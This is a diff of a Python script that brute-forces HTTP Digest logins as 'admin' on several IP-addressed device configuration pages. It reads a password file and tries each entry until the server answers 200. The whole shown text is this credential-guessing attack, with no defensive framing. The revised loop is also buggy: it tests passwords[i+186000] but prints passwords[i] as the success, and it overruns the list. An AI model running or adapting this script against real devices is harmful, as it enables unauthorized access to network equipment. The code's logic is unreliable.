@@ -10,17 +10,16 @@ url3 = 'http://138.207.175.210/configure'
 url4 = 'http://172.16.1.1/configure/index.cgi'
 
 
-with open('pswd.txt') as file:
+with open('pwd.txt') as file:
     passwords = [line.rstrip() for line in file]
 
 
-while True:
-    request = requests.head(url2, auth=HTTPDigestAuth('admin', passwords[passwordcounter]))
+for i in range(len(passwords)):
+    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i+186000]))
     if request.status_code == 200:
-        print(f'1, Success! Password is \"{passwords[passwordcounter]}\"')
+        print(f'\n\nSuccess! Password is \"{passwords[i]}\"')
         break
-    print('0', end=' ')
-    passwordcounter += 1
+    print(f'{i+186000}:{request.status_code}, ', end='')
 
 
 # r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
